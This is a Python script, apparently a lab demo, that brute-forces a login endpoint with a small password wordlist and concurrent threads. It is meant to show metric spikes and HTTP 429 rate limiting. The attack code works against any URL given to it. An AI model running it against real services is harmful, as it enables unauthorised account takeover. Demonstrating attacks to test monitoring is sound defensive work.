#!/usr/bin/env python3
"""
attack_bruteforce.py — Brute-force login attack simulator.

Fires rapid POST /login requests with a wordlist of passwords.
Demonstrates: login_attempts_total metric spike, rate limiting response (429).

Usage:
    python3 attack_bruteforce.py --url http://localhost:30080 --concurrency 20
"""

import argparse
import json
import threading
import time
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

# Small password wordlist — in a real pentest this would be rockyou.txt etc.
PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "abc123", "qwerty",
    "password1", "iloveyou", "sunshine", "princess", "admin123",
    "secret123",  # <-- this is the real one; shows up as success in metrics
    "football", "shadow", "superman", "michael",
]

class BruteStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.attempts = 0
        self.success = 0
        self.rate_limited = 0
        self.found_password: str | None = None

    def record(self, status: int, password: str):
        with self.lock:
            self.attempts += 1
            if status == 200:
                self.success += 1
                self.found_password = password
                print(f"\n[!] SUCCESS — password found: {password}")
            elif status == 429:
                self.rate_limited += 1
            elif self.attempts % 10 == 0:
                print(f"\r[*] Attempts: {self.attempts} | Rate limited: {self.rate_limited}",
                      end="", flush=True)


def attempt_login(base_url: str, username: str, password: str, stats: BruteStats):
    url = base_url.rstrip("/") + "/login"
    body = json.dumps({"username": username, "password": password}).encode()
    req = Request(url, data=body, method="POST",
                  headers={"Content-Type": "application/json"})
    try:
        with urlopen(req, timeout=5) as resp:
            stats.record(resp.status, password)
    except HTTPError as e:
        stats.record(e.code, password)
    except URLError:
        stats.record(0, password)


def main():
    parser = argparse.ArgumentParser(description="Brute-force login attack demo")
    parser.add_argument("--url", default="http://localhost:30080")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--concurrency", type=int, default=5,
                        help="Parallel threads (keep low to observe rate limiting)")
    parser.add_argument("--repeat", type=int, default=3,
                        help="How many times to cycle through the wordlist")
    args = parser.parse_args()

    stats = BruteStats()
    wordlist = PASSWORDS * args.repeat

    print(f"[*] Brute-force attack starting")
    print(f"[*] Target  : {args.url}/login")
    print(f"[*] Username: {args.username}")
    print(f"[*] Attempts: {len(wordlist)} ({args.concurrency} concurrent)")

    t0 = time.monotonic()

    sem = threading.Semaphore(args.concurrency)
    if True:
        threads = []
        for password in wordlist:
            sem.acquire()
            def run(p=password):
                try:
                    attempt_login(args.url, args.username, p, stats)
                finally:
                    sem.release()
            t = threading.Thread(target=run, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    elapsed = time.monotonic() - t0
    print(f"\n\n--- Brute-Force Attack Report ---")
    print(f"Duration     : {elapsed:.1f}s")
    print(f"Total attempts: {stats.attempts}")
    print(f"Rate limited  : {stats.rate_limited}")
    print(f"Successful    : {stats.success}")
    if stats.found_password:
        print(f"Password found: {stats.found_password}")
    else:
        print("Password NOT found in wordlist")


if __name__ == "__main__":
    main()
